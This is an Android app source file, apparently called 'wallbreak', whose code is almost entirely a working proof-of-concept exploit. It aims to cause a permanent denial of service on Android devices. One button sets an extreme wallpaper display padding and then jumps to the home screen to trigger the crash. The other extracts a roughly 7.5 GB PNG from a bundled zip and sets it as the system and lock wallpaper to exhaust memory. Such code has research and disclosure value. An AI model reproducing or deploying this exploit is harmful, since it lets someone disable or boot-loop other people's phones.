package me.sithi.wallbreak;

import androidx.appcompat.app.AppCompatActivity;

import android.app.ProgressDialog;
import android.app.WallpaperManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.graphics.Rect;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.android.material.progressindicator.LinearProgressIndicator;
import com.google.android.material.textfield.TextInputLayout;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.ref.WeakReference;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class MainActivity extends AppCompatActivity {

    /*-- Size of the exploit image, used to check whether past extractions were successful --*/
    static final long EXPLOIT_IMG_SIZE = 7503368920L;

    static AssetManager assetManager;
    static WallpaperManager wallpaperManager;

    static File path;
    static ContentResolver resolver;

    static Button stream;
    static Button padding;
    static EditText text;
    static LinearProgressIndicator progress;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        stream = findViewById(R.id.streamButton);
        padding = findViewById(R.id.paddingButton);
        progress = findViewById(R.id.progress);
        text = ((TextInputLayout) findViewById(R.id.padding)).getEditText();

        toggle(true);

        assetManager = this.getAssets();
        path = getExternalFilesDir(null);
        wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
        resolver = getContentResolver();

        stream.setOnClickListener(v -> {
            toggle(false);
            new StreamTask(this).execute();
        });

        padding.setOnClickListener(v -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                try {
                    int pval = Integer.parseInt(String.valueOf(text.getText()));
                    Rect rect = new Rect();
                    rect.bottom = pval;
                    rect.top = pval;
                    rect.left = pval;
                    rect.right = pval;
                    wallpaperManager.setDisplayPadding(rect);
                    /*-- Go to home screen, triggering the PDoS ---*/
                    Intent home = new Intent(Intent.ACTION_MAIN);
                    home.addCategory(Intent.CATEGORY_HOME);
                    home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(home);
                } catch (NumberFormatException e) {
                    Toast.makeText(this,
                            "Failed to parse entered padding value.",
                            Toast.LENGTH_LONG).show();
                } catch (Exception e) {
                    Toast.makeText(this,
                            "WallpaperManager error: " + e.getMessage(),
                            Toast.LENGTH_LONG).show();
                }
            }
            else {
                Toast.makeText(this,
                        "Your device runs Android O or older, so it doesn't support display padding.",
                        Toast.LENGTH_LONG).show();
            }
        });

    }

    private static class StreamTask extends AsyncTask<Void, Void, Integer> {
        private final WeakReference<MainActivity> ref;

        StreamTask(MainActivity context) {
            ref = new WeakReference<>(context);
        }

        @Override
        protected Integer doInBackground(Void... params) {
            return stream_exploit();
        }

        @Override
        protected void onPostExecute(Integer result) {
            MainActivity activity = ref.get();
            if (activity == null || activity.isFinishing()) return;
            if (result > 0)
                Toast.makeText(activity, "Exploit failed: setStream finished with result code " + result, Toast.LENGTH_LONG).show();
            else
                Toast.makeText(activity, "Error changing wallpaper with setStream", Toast.LENGTH_LONG).show();
            toggle(true);
        }
    }

    static void toggle(boolean state){
        stream.setEnabled(state);
        padding.setEnabled(state);
        if (state)
            progress.setVisibility(View.INVISIBLE);
        else
            progress.setVisibility(View.VISIBLE);
    }

    static int stream_exploit(){
        /*-- Location of large PNG file --*/
        File pngf = new File(path + "/exploit.png");
        /*-- Before extracting, verify that the PNG doesn't exist or is corrupted --*/
        if (!pngf.exists() || pngf.length() < EXPLOIT_IMG_SIZE) {
            //AssetManager am = this.getAssets();
            try {
                /*-- Fetch an asset ZIP containing the PNG and extract it --*/
                InputStream is = assetManager.open("exploit.zip");
                try (ZipInputStream zis = new ZipInputStream(
                        new BufferedInputStream(is))) {
                    ZipEntry ze;
                    int count;
                    byte[] buffer = new byte[8192];
                    while ((ze = zis.getNextEntry()) != null) {
                        File file = new File(path, ze.getName());
                        if (ze.isDirectory())
                            continue;
                        try (FileOutputStream fout = new FileOutputStream(file)) {
                            while ((count = zis.read(buffer)) != -1)
                                fout.write(buffer, 0, count);
                        }
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        try {
            /*-- Set the large PNG as the wallpaper --*/
            InputStream s = resolver.openInputStream(Uri.parse("file:///" + path + "/exploit.png"));
            int st = wallpaperManager.setStream(s,null,true,WallpaperManager.FLAG_LOCK | WallpaperManager.FLAG_SYSTEM);
            /*-- If we get here something is wrong... is the bug patched, or does the device have significantly more than 8GB RAM? --*/
            return st;
        } catch (Exception e) {
            return -1;
        }

    }
}
